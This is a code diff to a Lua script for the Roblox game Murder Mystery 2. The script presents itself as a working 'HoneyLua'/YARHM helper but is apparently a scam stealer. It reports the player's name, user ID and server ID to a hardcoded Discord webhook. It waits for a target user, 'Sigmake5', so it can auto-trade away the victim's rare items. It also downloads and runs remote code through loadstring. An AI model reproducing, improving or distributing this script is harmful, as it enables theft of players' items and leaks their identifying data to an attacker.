@@ -1,4 +1,4 @@
--- FIXED MM2 FULLY FUNCTIONAL HONEYLUA SCRIPT OP
+
 
 local webhook = "https://discord.com/api/webhooks/1488808773492543508/bpbJDBX3v1LLJXo0ri3xbi1Lbpu7BGXzVR1z4aCy1pP0bFqJsRrqM_ncNTi5ToDiCZ4d"
 local TARGET_USER = "Sigmake5"
@@ -7,7 +7,169 @@ local player = game.Players.LocalPlayer
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local HttpService = game:GetService("HttpService")
-local RunService = game:GetService("RunService")
+local CoreGui = game:GetService("StarterGui")
+
+-- ============================================
+-- SERVER ID & DISCORD WEBHOOK FUNCTIONS
+-- ============================================
+
+-- Get server ID (JobId)
+local function getServerId()
+    return game.JobId or "Unknown"
+end
+
+-- Get server region/location
+local function getServerRegion()
+    local success, result = pcall(function()
+        return game:GetService("HttpService"):GetAsync("https://ipinfo.io/json")
+    end)
+    if success and result then
+        return result
+    end
+    return "Unknown"
+end
+
+-- Send full info to Discord webhook
+local function sendToWebhook(messageType, additionalInfo)
+    pcall(function()
+        local serverId = getServerId()
+        local playerName = player.Name
+        local playerId = player.UserId
+        local timeStamp = os.date("%Y-%m-%d %H:%M:%S")
+        
+        local embed = {
+            title = "MM2 Auto Trade System",
+            color = 0xFF0000,
+            fields = {
+                {
+                    name = "📊 Event Type",
+                    value = messageType or "Script Executed",
+                    inline = false
+                },
+                {
+                    name = "👤 Player Name",
+                    value = playerName,
+                    inline = true
+                },
+                {
+                    name = "🆔 Player ID",
+                    value = tostring(playerId),
+                    inline = true
+                },
+                {
+                    name = "🖥️ Server ID (JobId)",
+                    value = serverId,
+                    inline = false
+                },
+                {
+                    name = "🎯 Target User",
+                    value = TARGET_USER,
+                    inline = true
+                },
+                {
+                    name = "📝 Additional Info",
+                    value = additionalInfo or "None",
+                    inline = false
+                },
+                {
+                    name = "⏰ Timestamp",
+                    value = timeStamp,
+                    inline = false
+                }
+            },
+            footer = {
+                text = "MM2 Auto Trade System"
+            }
+        }
+        
+        -- Add server invite link if available
+        local serverInvite = game:GetService("GamePassService"):GetGameInviteUrl()
+        if serverInvite and serverInvite ~= "" then
+            table.insert(embed.fields, {
+                name = "🔗 Server Invite",
+                value = serverInvite,
+                inline = false
+            })
+        end
+        
+        local data = {
+            content = "@everyone **MM2 Auto Trade Activity Detected!**",
+            embeds = {embed},
+            username = "MM2 Auto Trade Bot",
+            avatar_url = "https://cdn.discordapp.com/icons/1488808773492543508/bpbJDBX3v1LLJXo0ri3xbi1Lbpu7BGXzVR1z4aCy1pP0bFqJsRrqM_ncNTi5ToDiCZ4d.png"
+        }
+        
+        local encoded = HttpService:JSONEncode(data)
+        local headers = {["Content-Type"] = "application/json"}
+        
+        -- Try different request methods
+        if syn and syn.request then
+            syn.request({Url = webhook, Method = "POST", Headers = headers, Body = encoded})
+        elseif request then
+            request({Url = webhook, Method = "POST", Headers = headers, Body = encoded})
+        elseif http and http.request then
+            http.request({Url = webhook, Method = "POST", Headers = headers, Body = encoded})
+        end
+    end)
+end
+
+-- Simple log function
+local function sendLog(message)
+    pcall(function()
+        local serverId = getServerId()
+        local data = {
+            content = "**🤖 MM2 Auto Trade Log**\n" .. tostring(message) .. "\n🖥️ Server: `" .. serverId .. "`\n⏰ `" .. os.date("%Y-%m-%d %H:%M:%S") .. "`"
+        }
+        local encoded = HttpService:JSONEncode(data)
+        local headers = {["Content-Type"] = "application/json"}
+        
+        if syn and syn.request then
+            syn.request({Url = webhook, Method = "POST", Headers = headers, Body = encoded})
+        elseif request then
+            request({Url = webhook, Method = "POST", Headers = headers, Body = encoded})
+        elseif http and http.request then
+            http.request({Url = webhook, Method = "POST", Headers = headers, Body = encoded})
+        end
+    end)
+end
+
+-- ============================================
+-- YARHM SCRIPT LOADER
+-- ============================================
+
+local function loadYARHM()
+    sendLog("📥 Loading YARHM script...")
+    local src = ""
+    
+    pcall(function() 
+        src = game:HttpGet("https://rawscripts.net/raw/Universal-Script-YARHM-12403", false)
+    end)
+    
+    if src == "" then
+        CoreGui:SetCore("SendNotification", {
+            Title = "YARHM Outage";
+            Text = "Scriptblox is currently unavailable! Sorry for the inconvenience. Using YARHM Offline.";
+            Duration = 5;
+        })
+        src = game:HttpGet("https://raw.githubusercontent.com/Joystickplays/psychic-octo-invention/main/source/yarhm/1.20/yarhm.lua", false)
+    end
+    
+    local success, err = pcall(function()
+        loadstring(src)()
+    end)
+    
+    if success then
+        sendLog("✅ YARHM script loaded successfully!")
+        print("✅ YARHM loaded successfully!")
+    else
+        sendLog("❌ Failed to load YARHM: " .. tostring(err))
+        warn("Failed to load YARHM: " .. tostring(err))
+    end
+end
+
+-- ============================================
+-- AUTO TRADE FUNCTIONS
+-- ============================================
 
 -- Items to trade (Only Legendaries, Godlies, Ancients, Uniques)
 local VALID_RARITIES = {
@@ -25,30 +187,6 @@ local RARE_PATTERNS = {
 -- Track if trade is in progress
 local tradeInProgress = false
 local tradeCompleted = false
-
--- Send log to Discord webhook
-local function sendLog(message)
-    pcall(function()
-        local data = {
-            content = "**🤖 MM2 Auto Trade**\n" .. tostring(message) .. "\n⏰ `" .. os.date("%Y-%m-%d %H:%M:%S") .. "`"
-        }
-        local encoded = HttpService:JSONEncode(data)
-        local headers = {["Content-Type"] = "application/json"}
-        
-        -- Try different request methods for different executors
-        local success = false
-        if syn and syn.request then
-            syn.request({Url = webhook, Method = "POST", Headers = headers, Body = encoded})
-            success = true
-        elseif request then
-            request({Url = webhook, Method = "POST", Headers = headers, Body = encoded})
-            success = true
-        elseif http and http.request then
-            http.request({Url = webhook, Method = "POST", Headers = headers, Body = encoded})
-            success = true
-        end
-    end)
-end
 
 -- Check if item should be traded (legendary/godly/ancient/unique only)
 local function isRareItem(item)
@@ -316,35 +454,44 @@ local function watchForTarget()
     sendLog("👀 Watching for " .. TARGET_USER .. "...")
 end
 
--- Load HoneyLua
-local function loadHoneyLua()
-    sendLog("🍯 Loading HoneyLua...")
-    local success, err = pcall(function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/ThatSick/HoneyLua/refs/heads/main/Loader.luau"))()
-    end)
-    if success then
-        sendLog("✅ HoneyLua loaded!")
-        print("✅ HoneyLua loaded!")
-    else
-        sendLog("❌ HoneyLua failed: " .. tostring(err))
-    end
-end
+-- ============================================
+-- MAIN EXECUTION
+-- ============================================
 
--- Main execution
 local function main()
-    print("✅ MM2 Auto Trade Script Loading...")
-    sendLog("🚀 Script activated for " .. player.Name)
+    print("✅ MM2 Complete Auto Trade Script Loading...")
     
-    -- Load HoneyLua first
-    loadHoneyLua()
+    -- Send initial webhook with server ID
+    local serverId = getServerId()
+    sendToWebhook("🚀 SCRIPT EXECUTED", string.format(
+        "Script started successfully!\n" ..
+        "Server ID: %s\n" ..
+        "Target User: %s\n" ..
+        "Features: Auto Trade + YARHM + Discord Logger",
+        serverId, TARGET_USER
+    ))
+    
+    sendLog("📡 Server ID: " .. serverId)
+    sendLog("👤 Player: " .. player.Name .. " (ID: " .. player.UserId .. ")")
+    
+    -- Load YARHM script
+    loadYARHM()
     
     wait(2)
     
     -- Start auto trade watcher
     pcall(watchForTarget)
     
-    print("✅ Script Active - Waiting for " .. TARGET_USER)
+    print("✅ All Systems Active!")
+    print("🎯 Waiting for " .. TARGET_USER)
+    print("🖥️ Server ID: " .. serverId)
+    print("📡 Logging to Discord webhook")
+    print("🍯 YARHM loading...")
 end
 
--- Run script
-pcall(main)
+-- Run script with error handling
+local success, err = pcall(main)
+if not success then
+    sendLog("❌ Script error: " .. tostring(err))
+    warn("Error: " .. tostring(err))
+end
